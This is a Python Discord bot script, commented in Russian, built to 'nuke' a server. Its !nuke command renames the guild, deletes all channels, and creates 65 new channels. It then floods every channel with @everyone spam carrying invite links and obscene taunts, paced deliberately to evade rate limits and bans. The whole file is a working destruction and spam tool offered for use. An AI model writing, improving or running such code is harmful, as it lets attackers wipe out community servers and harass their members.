import discord
from discord.ext import commands
import asyncio

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

@bot.event
async def on_ready():
    print(f'✅ {bot.user} готов к уничтожению')

@bot.command()
async def nuke(ctx):
    await ctx.send("**nonerp ebet**")
    
    guild = ctx.guild
    
    # 1. МЕНЯЕМ НАЗВАНИЕ
    try:
        await guild.edit(name="OWNED BY GVK X NL")
        print("✅ Название изменено")
    except:
        print("❌ Не удалось изменить название")
    
    # 2. УДАЛЯЕМ КАНАЛЫ НЕ БЫСТРО, НО И НЕ МЕДЛЕННО (с паузами)
    print("🗑️ Удаление каналов (оптимальная скорость)...")
    
    deleted = 0
    skipped = 0
    
    for i, channel in enumerate(guild.channels):
        try:
            await channel.delete()
            deleted += 1
            print(f"   ✅ [{i+1}/{len(guild.channels)}] Удален: #{channel.name}")
            
            # Пауза после каждых 5 каналов чтобы не ловить варнинг
            if (i + 1) % 5 == 0:
                await asyncio.sleep(0.3)
            
        except discord.Forbidden:
            print(f"   ⚠️ Нет прав: #{channel.name}")
            skipped += 1
        except discord.HTTPException as e:
            if "59074" in str(e):
                print(f"   🛡️ Защищенный канал (пропущен): #{channel.name}")
                skipped += 1
            else:
                print(f"   ❌ Ошибка: {e}")
                skipped += 1
        except Exception as e:
            print(f"   ❌ Ошибка: #{channel.name} - {e}")
            skipped += 1
        
        # Маленькая пауза между каналами
        await asyncio.sleep(0.1)
    
    print(f"📊 Каналы: удалено {deleted}, пропущено {skipped}")
    
    # Небольшая пауза перед созданием каналов
    print("⏳ Пауза 2 секунды перед созданием каналов...")
    await asyncio.sleep(2)
    
    # 3. СОЗДАЁМ 65 КАНАЛОВ (быстро но с умом)
    print("🔥 Создание 65 каналов и отправка 35 сообщений...")
    
    SPAM_TEXT = """@everyone
**ТРАХНУТЫ BY GVK X NL**

https://discord.gg/neverlosetsb
https://discord.gg/U3XqQjb5h5

ВЫ УПАЛИ НА КОЛЕНИ ПЕРЕД ЦАРЯМИ NLxGVK
"""
    
    async def create_and_spam(i):
        try:
            # Создаем канал
            ch = await guild.create_text_channel(f"gvk-nuked-{i+1}")
            
            # Отправляем 35 сообщений (с микро-паузами чтобы не ловить бан)
            for j in range(35):
                await ch.send(SPAM_TEXT)
                if j % 5 == 0:  # Пауза каждые 5 сообщений
                    await asyncio.sleep(0.1)
            
            print(f"✅ Канал {i+1}/65 готов (35 сообщений)")
            return True
            
        except discord.Forbidden:
            print(f"❌ Нет прав на создание канала {i+1}")
            return False
        except discord.HTTPException as e:
            if "rate" in str(e).lower():
                print(f"⚠️ Rate limit на канале {i+1}, жду 1 секунду...")
                await asyncio.sleep(1)
                return await create_and_spam(i)
            else:
                print(f"❌ Ошибка канала {i+1}: {e}")
                return False
        except Exception as e:
            print(f"❌ Ошибка {i+1}: {e}")
            return False
    
    # Создаем каналы с небольшой очередью (по 5 каналов параллельно)
    success_count = 0
    batch_size = 5
    
    for batch_start in range(0, 65, batch_size):
        batch_end = min(batch_start + batch_size, 65)
        batch_tasks = []
        
        for i in range(batch_start, batch_end):
            batch_tasks.append(create_and_spam(i))
        
        results = await asyncio.gather(*batch_tasks)
        success_count += sum(results)
        
        print(f"📦 Пакет {batch_start//batch_size + 1} завершен, пауза 1 секунда...")
        await asyncio.sleep(1)  # Пауза между пакетами
    
    # 4. ДОБИВАЕМ ОСТАВШИЕСЯ КАНАЛЫ (если есть)
    print("\n💣 Добиваем оставшиеся каналы...")
    
    for channel in guild.text_channels:
        try:
            if not channel.name.startswith("gvk-nuked"):
                for _ in range(35):
                    await channel.send(SPAM_TEXT)
                    await asyncio.sleep(0.05)
                print(f"   ✅ Добит: #{channel.name}")
        except:
            pass
    
    print("\n" + "="*50)
    print("💀 НЬЮК ЗАВЕРШЁН 💀")
    print(f"✅ Создано каналов: {success_count}")
    print(f"✅ Отправлено сообщений: {success_count * 35}")
    print("="*50)
    
    try:
        await ctx.send("**✅ СЕРВЕР УНИЧТОЖЕН**")
    except:
        pass

@bot.command()
async def status(ctx):
    await ctx.send("🔥 Бот активен! Используй !nuke")

import os
bot.run(os.environ['TOKEN'])
